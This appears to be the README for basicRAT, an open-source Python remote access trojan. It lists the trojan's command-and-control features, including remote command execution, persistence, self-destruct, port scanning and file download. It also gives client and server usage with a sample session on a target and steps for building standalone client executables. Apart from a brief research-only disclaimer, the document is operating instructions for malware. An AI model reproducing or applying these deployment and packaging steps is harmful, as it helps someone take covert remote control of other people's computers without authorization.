# RAT

This is a cross-platform Python 2.7.x Remote Access Trojan (RAT). Currently still a work in progress, and gets hacked on as time allows. See the `binaries/` folder for prebuilt client executables.

**Disclaimer: This RAT is for research purposes only, and should only be used on authorized systems. Accessing a computer system or network without authorization or explicit permission is illegal.**

## Features
* Cross-platform (Windows, Linux, and macOS)
* AES-256 encrypted C2 with D-H exchange
* Accepts connection from multiple clients
* Command execution
* Standard utilities (cat, ls, pwd, unzip, wget)
* System survey
* Self-destruct
* Primitive port scanning
* Client reconnect

## Usage

### Client
```
C:\>basicRAT_client.exe --ip 127.0.0.1 --port 1337 --timeout 30
```
Where `ip` is the basicRAT server IP address, `port` is the server listening port, and `timeout` is the number of seconds the client waits to attempt a reconnect to the server (if disconnected). These are the default values if not specified, you will likely need to supply at least an IP and port if using basicRAT outside of your local system.

### Server
```
$ python basicRAT_server.py --port 1337

 ____    ____  _____ ____   __  ____    ____  ______      .  ,
|    \  /    |/ ___/|    | /  ]|    \  /    ||      |    (\;/)
|  o  )|  o  (   \_  |  | /  / |  D  )|  o  ||      |   oo   \//,        _
|     ||     |\__  | |  |/  /  |    / |     ||_|  |_| ,/_;~      \,     / '
|  O  ||  _  |/  \ | |  /   \_ |    \ |  _  |  |  |   "'    (  (   \    !
|     ||  |  |\    | |  \     ||  .  \|  |  |  |  |         //  \   |__.'
|_____||__|__| \___||____\____||__|\_||__|__|  |__|       '~  '~----''
         https://github.com/vesche/basicRAT

basicRAT server listening for connections on port 1337.

[?] basicRAT> help
Command             | Description
---------------------------------------------------------------------------
cat <file>          | Output a file to the screen.
client <id>         | Connect to a client.
clients             | List connected clients.
execute <command>   | Execute a command on the target.
goodbye             | Exit the server and selfdestruct all clients.
help                | Show this help menu.
kill                | Kill the client connection.
ls                  | List files in the current directory.
persistence         | Apply persistence mechanism.
pwd                 | Get the present working directory.
quit                | Exit the server and keep all clients alive.
scan <ip>           | Scan top 25 TCP ports on a single host.
selfdestruct        | Remove all traces of the RAT from the target system.
survey              | Run a system survey.
unzip <file>        | Unzip a file.
wget <url>          | Download a file from the web.

[?] basicRAT> clients
ID | Client Address
-------------------
 1 | 127.0.0.1

[?] basicRAT> client 1
Client 1 selected.

[1] basicRAT> execute uname -a
Running execute...
Linux sandbox3 4.9.17-c9 #1 SMP Thu Mar 23 01:38:54 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
execute completed.
```

## Build your own stand-alone executable
If you'd rather not use one the prebuilt binaries, you can easily create your own executable like so:

On Windows you will need:
  * [Python 2.7.x](https://www.python.org/downloads/)
  * [PyInstaller](http://www.pyinstaller.org/)
  * [PyCrypto 2.6 for Python 2.7](http://www.voidspace.org.uk/python/modules.shtml#pycrypto)
  * [PyWin32](https://sourceforge.net/projects/pywin32/files/pywin32/)
  * [pefile](https://github.com/erocarrera/pefile)

Then run something like `C:\path\to\PyInstaller-3.2\PyInstaller-3.2\pyinstaller.py --onefile basicRAT_client.py` from the basicRAT repo folder and it should generate a `dist/` folder that will contain a stand-alone PE (portable executable).

On Linux/macOS you will need:
  * [Python 2.7.x](https://www.python.org/downloads/)
  * PyInstaller & PyCrypto - `$ pip install pyinstaller pycrypto`

Then run something like `pyinstaller --onefile basicRAT_client.py` from the basicRAT repo folder and it should generate a `dist/` folder that will contain a stand-alone ELF/Mach-O executable.

## Contributors
* Austin Jackson [@vesche](https://github.com/vesche)
* Skyler Curtis [@deadPix3l](https://github.com/deadPix3l)
* [@reznok](https://github.com/reznok), multiple client connection prototype

## Other open-source Python RATs for Reference
* [nathanlopez/Stitch](https://github.com/nathanlopez/Stitch)
* [n1nj4sec/pupy](https://github.com/n1nj4sec/pupy)
* [sweetsoftware/Ares](https://github.com/sweetsoftware/Ares)
* [ahhh/Reverse_DNS_Shell](https://github.com/ahhh/Reverse_DNS_Shell)
